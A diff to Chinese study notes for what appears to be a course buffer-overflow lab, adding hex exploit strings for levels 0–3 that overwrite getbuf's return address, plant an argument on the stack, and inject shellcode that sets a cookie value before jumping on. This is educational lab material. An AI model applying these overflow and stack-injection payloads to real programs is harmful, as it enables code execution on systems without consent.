@@ -90,12 +90,8 @@ retq
 
 转为汇编
 ```
-vim bang.s
-gcc -m32 -c bang.s
-objdump -d bang.o > bang.txt
-cat bang.txt
 
-bang.o：     文件格式 elf32-i386
+bang.o：     elf32-i386
 
 
 Disassembly of section .text:
@@ -128,11 +124,24 @@ a1 cc a1 04 08 68 1e 90 04 08 c3 00 a8 b0 ff ff 7c b0 ff ff
 ![[Pasted image 20240526214127.png]]
 ### level 0
 只需要覆盖getbuf原本的返回值
+`0x08048e20`
+```
+01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 20 8e 04 08
+```
 ### level 1
-覆盖getbuf的返回值，对于入参还要将其放在对应的地方
+覆盖getbuf的返回值，对于入参val还要将其放在对应的地方ebp+8
+```
+01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 c0 8d 04 08 00 00 00 00 b2 cb 1e 75
+```
 ### level 2
 要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
 指令内容：将cookie的值放入global_value，并push函数地址，这样执行完指令后跳转
+```
+a1 cc a1 04 08 a3 dc a1 04 08 68 60 8d 04 08 c3 7c be ff ff
+```
 ### level 3
+```
+a1 cc a1 04 08 68 1e 90 04 08 c3 00 a8 be ff ff 7c be ff ff
+```
 要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
 指令内容：将cookie的值放入eax，并push下一条执行的地址，这样执行完指令后跳转
